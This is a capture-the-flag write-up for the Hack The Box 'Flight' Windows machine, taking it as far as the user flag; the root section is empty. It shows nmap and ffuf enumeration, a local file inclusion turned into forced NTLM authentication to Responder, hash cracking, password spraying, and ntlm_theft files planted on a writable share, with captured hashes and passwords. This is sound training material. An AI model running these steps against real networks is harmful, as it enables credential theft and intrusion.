# Flight

# User Flag

## NMAP Enumeration

All port scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.187

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49737/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.187 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49737

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-03 20:36:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-03T20:37:31
|_  start_date: N/A
```

## Website Enumeration

FFuF to fuzz the web url:

```bash
ffuf -c -u http://10.10.11.187/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

images                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 87ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 98ms]
Images                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 81ms]
css                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 69ms]
js                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 162ms]
licenses                [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 92ms]
IMAGES                  [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 102ms]
%20                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 94ms]
*checkout*              [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 238ms]
CSS                     [Status: 301, Size: 334, Words: 22, Lines: 10, Duration: 84ms]
JS                      [Status: 301, Size: 333, Words: 22, Lines: 10, Duration: 89ms]
phpmyadmin              [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 163ms]
webalizer               [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 168ms]
*docroot*               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 161ms]
*                       [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 244ms]
con                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 171ms]
http%3A                 [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 317ms]
**http%3a               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
*http%3A                [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
                        [Status: 200, Size: 7069, Words: 1546, Lines: 155, Duration: 80ms]
aux                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 143ms]
**http%3A               [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 134ms]
%C0                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 83ms]
server-status           [Status: 403, Size: 420, Words: 37, Lines: 12, Duration: 79ms]
%3FRID%3D2671           [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 89ms]
devinmoore*             [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 127ms]
200109*                 [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 72ms]
*sa_                    [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
*dc_                    [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%D8                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 75ms]
%CF                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 78ms]
%CE                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 79ms]
%CD                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
%CC                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 88ms]
%CB                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
%CA                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 95ms]
%D1                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 92ms]
%D5                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 74ms]
%D4                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 75ms]
%D3                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
%D2                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 87ms]
%C2                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 89ms]
%C7                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%C5                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 92ms]
%C3                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 85ms]
%C4                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 90ms]
%D9                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 93ms]
%DE                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 70ms]
%DF                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 73ms]
%DD                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 66ms]
%DB                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 77ms]
%D0                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 353ms]
%D6                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 396ms]
%D7                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 398ms]
%C1                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 402ms]
%C8                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 404ms]
%C9                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 406ms]
%C6                     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 391ms]
login%3f                [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 82ms]
%22julie%20roehm%22     [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 88ms]
%22james%20kim%22       [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 95ms]
%22britney%20spears%22  [Status: 403, Size: 301, Words: 22, Lines: 10, Duration: 93ms]
```

Notes:
* Website is running PHP version 8.1.1.
* Potential usernames found:

```
devinmoore
julie roehm
james kim
britney spears
```

Found an additional virtual host:

```bash
ffuf -u http://flight.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.flight.htb' -fs 7069 -c -t 50

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 380ms]
```

Enumerated new vhost found:

```bash
ffuf -c -u http://school.flight.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic

images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 94ms]
                        [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 540ms]
Images                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 80ms]
styles                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 76ms]
licenses                [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 70ms]
IMAGES                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 78ms]
%20                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 81ms]
*checkout*              [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 74ms]
phpmyadmin              [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 180ms]
webalizer               [Status: 403, Size: 425, Words: 37, Lines: 12, Duration: 93ms]
Styles                  [Status: 301, Size: 347, Words: 22, Lines: 10, Duration: 601ms]
*docroot*               [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 171ms]
*                       [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 107ms]
con                     [Status: 403, Size: 306, Words: 22, Lines: 10, Duration: 241ms]
```

##  Local File Inclusion (LFI)

I found that the URL contains a `view` parameter that disaplyas the selected web page:

```bash
http://school.flight.htb/index.php?view=blog.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=home.html
```

This `view` parameter looks vulnerable to Local File Inclusion (LFI) attacks and after some testing is determined to be exploitable for LFI:

```bash
# returns contents of /etc/hosts
http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
```

Using responder, we can provide a payload for the target machine to reach out to and capture the hash of the user that the Apache service is running under.

```bash
http://school.flight.htb/index.php?view=//<ip address>/htb
```

We setup responder and get a hash as seen below:

```bash
sudo responder -I tun0 -v

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:93c2cc52effeff54:5A1DE2988EBFD0334AB7BE8E78BEBEBF:0101000000000000801C0B6CC0E5DA01EEBD34ED73BF27BD0000000002000800430042003300340001001E00570049004E002D0042004100570038005A0059005200450052005500500004003400570049004E002D0042004100570038005A005900520045005200550050002E0043004200330034002E004C004F00430041004C000300140043004200330034002E004C004F00430041004C000500140043004200330034002E004C004F00430041004C0007000800801C0B6CC0E5DA01060004000200000008003000300000000000000000000000003000005F6DCC36C79B9F3A483CED4CFCB9D4106FBE5476D55BA3CB59EB4CBC46A429F80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
```

Used hashcat to crack it:

```bash
hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
```

New credentials: `svc_apache:S@Ss!K@*t13`

## Kerberos

Created userlist and tested for potential users but did not find any:

```bash
sudo ./kerbrute_linux_amd64 userenum --dc 10.10.11.187 -d flight.htb -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Flight/userlist
```

## SMB Enumeration

Used the credentials `svc_apache:S@Ss!K@*t13` and enumerated SMB shares with `crackmapexec`:

```bash
crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares

SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

Enumerated users:

```bash
crackmapexec smb 10.10.11.187 -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute

SMB         10.10.11.187    445    G0               498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               500: flight\Administrator (SidTypeUser)
SMB         10.10.11.187    445    G0               501: flight\Guest (SidTypeUser)
SMB         10.10.11.187    445    G0               502: flight\krbtgt (SidTypeUser)
SMB         10.10.11.187    445    G0               512: flight\Domain Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               513: flight\Domain Users (SidTypeGroup)
SMB         10.10.11.187    445    G0               514: flight\Domain Guests (SidTypeGroup)
SMB         10.10.11.187    445    G0               515: flight\Domain Computers (SidTypeGroup)
SMB         10.10.11.187    445    G0               516: flight\Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               517: flight\Cert Publishers (SidTypeAlias)
SMB         10.10.11.187    445    G0               518: flight\Schema Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               519: flight\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               520: flight\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.187    445    G0               521: flight\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               522: flight\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.187    445    G0               525: flight\Protected Users (SidTypeGroup)
SMB         10.10.11.187    445    G0               526: flight\Key Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               527: flight\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.187    445    G0               553: flight\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.187    445    G0               571: flight\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.187    445    G0               572: flight\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.187    445    G0               1000: flight\Access-Denied Assistance Users (SidTypeAlias)
SMB         10.10.11.187    445    G0               1001: flight\G0$ (SidTypeUser)
SMB         10.10.11.187    445    G0               1102: flight\DnsAdmins (SidTypeAlias)
SMB         10.10.11.187    445    G0               1103: flight\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.187    445    G0               1602: flight\S.Moon (SidTypeUser)
SMB         10.10.11.187    445    G0               1603: flight\R.Cold (SidTypeUser)
SMB         10.10.11.187    445    G0               1604: flight\G.Lors (SidTypeUser)
SMB         10.10.11.187    445    G0               1605: flight\L.Kein (SidTypeUser)
SMB         10.10.11.187    445    G0               1606: flight\M.Gold (SidTypeUser)
SMB         10.10.11.187    445    G0               1607: flight\C.Bum (SidTypeUser)
SMB         10.10.11.187    445    G0               1608: flight\W.Walker (SidTypeUser)
SMB         10.10.11.187    445    G0               1609: flight\I.Francis (SidTypeUser)
SMB         10.10.11.187    445    G0               1610: flight\D.Truff (SidTypeUser)
SMB         10.10.11.187    445    G0               1611: flight\V.Stevens (SidTypeUser)
SMB         10.10.11.187    445    G0               1612: flight\svc_apache (SidTypeUser)
SMB         10.10.11.187    445    G0               1613: flight\O.Possum (SidTypeUser)
SMB         10.10.11.187    445    G0               1614: flight\WebDevs (SidTypeGroup)
```

Performed a password spray attack with crackmapexec:

```bash
crackmapexec smb flight.htb -u userlist -p 'S@Ss!K@*t13'

SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
```

Found a new set of credentials: `S.Moon:S@Ss!K@*t13`

Enumerating shares shows that we have we have WRITE access to the `Shared` share.

```bash
crackmapexec smb 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13' --shares

SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

Accessing `Shared` share shows that it is empty:

```bash
smbclient //10.10.11.187/Shared --user 'S.Moon' --password 'S@Ss!K@*t13'
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Sun Aug  4 00:35:56 2024
  ..                                  D        0  Sun Aug  4 00:35:56 2024
```


The `Shared` share name indicates that multiple users can probably access this share. In Windows, many files get automatically "executed" when they are placed inside a directory and that directory gets accessed. These files may point to a network share for a resource, forcing the machine to authenticate to access the resource. A tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) creates several files that could potentially be used to steal the NTLMv2 hash of a user just by accessing a folder.

1. Set up Resonder to intercept any potential authentication requests.

```bash
sudo responder -I tun0 -v
```

2. Clone the ntl_theft tool and create our malicious files.

```bash
git clone https://github.com/Greenwolf/ntlm_theft

python3 ntlm_theft.py --generate all --server <kali_machine_ip> --filename htb

Created: htb/htb.scf (BROWSE TO FOLDER)
Created: htb/htb-(url).url (BROWSE TO FOLDER)
Created: htb/htb-(icon).url (BROWSE TO FOLDER)
Created: htb/htb.lnk (BROWSE TO FOLDER)
Created: htb/htb.rtf (OPEN)
Created: htb/htb-(stylesheet).xml (OPEN)
Created: htb/htb-(fulldocx).xml (OPEN)
Created: htb/htb.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: htb/htb-(includepicture).docx (OPEN)
Created: htb/htb-(remotetemplate).docx (OPEN)
Created: htb/htb-(frameset).docx (OPEN)
Created: htb/htb-(externalcell).xlsx (OPEN)
Created: htb/htb.wax (OPEN)
Created: htb/htb.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: htb/htb.asx (OPEN)
Created: htb/htb.jnlp (OPEN)
Created: htb/htb.application (DOWNLOAD AND OPEN)
Created: htb/htb.pdf (OPEN AND ALLOW)
Created: htb/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: htb/Autorun.inf (BROWSE TO FOLDER)
Created: htb/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

3. Inside the parentheses, the tool informs us as to what action is required to trigger the file. Let's start by focusing on those that require the least amount of interaction, just by browsing to that folder. Our next step is to upload all the files that have the `(BROWSE TO FOLDER)` requirement to the `Shared` share. It appers that only files with the `.ini` extension could be uploaded. 

```bash
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 0.2 kb/s)
smb: \> dir
  .                                   D        0  Sun Aug  4 18:04:48 2024
  ..                                  D        0  Sun Aug  4 18:04:48 2024
  desktop.ini                         A       47  Sun Aug  4 18:04:48 2024
```

4. We then get a hash from `responder`, which we can crack with `hashcat` to get some credentials.

 ```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:c8049249c5e0698e:5AEA6CF0865325C751C5C72D75A0E0DF:0101000000000000803912695DE6DA0139EA1BA1B4C256120000000002000800550046005200430001001E00570049004E002D00390034004F0046004500580048005300390059004D0004003400570049004E002D00390034004F0046004500580048005300390059004D002E0055004600520043002E004C004F00430041004C000300140055004600520043002E004C004F00430041004C000500140055004600520043002E004C004F00430041004C0007000800803912695DE6DA01060004000200000008003000300000000000000000000000003000002250370D1BCF36A14904EABBF9EB4B3F9333E18726ED8029FFD34CC63C0BE0D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
```

Hashcat command:

```bash
hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
```

New Credentials: `c.bum:Tikkycoll_431012284`

We can then get the user flag via the `Users` SMB share:

```bash
smbclient //10.10.11.187/Users --user 'c.bum' --password 'Tikkycoll_431012284'

smb: \C.Bum\Desktop\> dir
  .                                  DR        0  Thu Sep 22 21:17:02 2022
  ..                                 DR        0  Thu Sep 22 21:17:02 2022
  user.txt                           AR       34  Sun Aug  4 17:51:15 2024
```

# Root Flag

## Privilege Escalation
















